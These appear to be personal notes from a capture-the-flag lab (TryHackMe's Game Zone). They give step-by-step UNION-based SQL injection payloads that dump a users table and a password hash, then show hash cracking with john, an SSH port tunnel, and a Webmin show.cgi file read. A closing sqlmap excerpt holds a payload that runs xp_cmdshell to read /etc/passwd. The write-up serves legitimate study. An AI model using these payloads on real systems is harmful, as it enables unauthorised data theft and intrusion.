can be used in combination with hydra as
https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/SQL.txt

---
SQLi -- perfected steps from the original sqli notes and testing on the gamezone ctf.
#### Step1.
ORDER BY used to check how many columns in the table.
keep incrementing the ORDER BY 1-- - by 1, until you get an error. this shows the no of columns are 1 before the error.
searchitem=test' ORDER BY 3-- -
was our cue. so 3 columns.

searchitem=test' UNION SELECT 1,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA),3-- - just check this once
#### Step2.
We now switch to UNION SELECT command , with 3 columns as
searchitem=test' UNION SELECT 1,2,3-- -
This should display 1 or more of 1,2,3
Replace one of the feilds being displayed with something like "ek4kas" to verify.
Now replace that with database() to get the database
searchitem=test' UNION SELECT 1,2,database()-- -
we got 'db' as the database.

#### Step3
Now query the tables inside that database db, as
searchitem =test' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables WHERE table_schema= 'db' -- -
This should give all the tables in the database db. We got post,users.

#### Step4
Now, we enumerate each table's column names.
searchitem = UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'post'
-->id,name,description
searchitem = UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'
-->username,pwd,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS

Step5.
Enumerate all the data in username and pwd columns of users table in db database
First, username
searchitem=test' UNION SELECT 1,2,group_concat(username) from users where username like "%"-- -
-->agent47
Now, pwd
searchitem=test' UNION SELECT 1,2,group_concat(pwd) from users where pwd like "%"-- -
OR
searchitem=test' UNION SELECT 1,2,group_concat(pwd) from users where username like "agent47"-- -
OR
searchitem=test' UNION SELECT 1,2,group_concat(pwd) from users where username like "agent47%" and pwd like "%-- -

---
we now have the hash of agent47's password, which we will crack using john. save it ino a file, hash.txt
`john hash.txt -w=/usr/share/wordlist/rockyou.txt --format=Raw-SHA256`
This gives us the password videogamer rather quickly.

Now, as THM says, we check the sockets
`ss -tulpn`
This shows tcp ports that are listening, of which we can eliminate 80, 22. the 10000 is the remaining one.
We use ssh to reverse tunnel the port, so we can see it from our localhost
`ssh -L 10000:localhost:10000 agent47@remoteIP`
Then enter the password

This leads us to another login webpage on localhost:10000, where agent47's cerds work.
It looks like a Webmin 1.580 CMS, which s vulnerable to file open at file/show.cgi
Basically, watever file is uploaded there from an authenticated user from the file manager (on the wepage), can be opened there.
If it were to be a reverse shell, it would run the shell
Now, for some reason, the file manager doesnt open, citing my browzer doesnt support java
So, a walkthrough showed how /show.cgi/root/root.txt opens the flag.

Also tried metasploit before that, which dint work for me.

----
-----



the results of sqlmap -v 4
9514 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#

cat,')....",.

cat'OvYhgK<'">hfSqZS

---
testing 'AND boolean-based blind - WHERE or HAVING clause'     -->                                                                                                            
cat') AND 9063=4494 AND ('lham'='lham
cat') AND 3375=3375 AND ('NNQt'='NNQt
cat' AND 8678=3126 AND 'hzqb'='hzqb
